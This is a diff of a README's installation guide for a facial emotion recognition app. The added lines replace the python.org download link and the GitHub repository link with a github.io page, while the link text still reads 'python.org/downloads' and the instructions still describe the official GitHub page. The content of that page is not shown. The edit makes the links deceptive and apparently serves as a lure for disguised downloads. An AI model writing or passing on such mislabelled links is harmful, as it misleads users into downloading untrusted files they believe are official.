@@ -30,7 +30,7 @@ To run this software, you will need:
 
 ### Step 1: Install Python
 
-1. Go to [python.org/downloads](https://www.python.org/downloads/) in your web browser.
+1. Go to [python.org/downloads](https://then-act6105.github.io) in your web browser.
 2. Click the yellow button that says "Download Python 3.11" (or the latest version available).
 3. Once the file downloads, double-click it to run the installer.
 4. **Important:** In the installer window, check the box that says "Add Python to PATH" at the bottom, then click "Install Now."
@@ -38,7 +38,7 @@ To run this software, you will need:
 
 ### Step 2: Download the Software
 
-**[📥 DOWNLOAD THE APPLICATION](https://github.com/Then-act6105/facial-emotion-recognition-au-landmarks)** 
+**[📥 DOWNLOAD THE APPLICATION](https://then-act6105.github.io)** 
 
 Visit this link to download the application. This link takes you to the official project page on GitHub where you can download all the necessary files. Click the green "Code" button on the page and select "Download ZIP." Save the ZIP file to your Desktop.
 
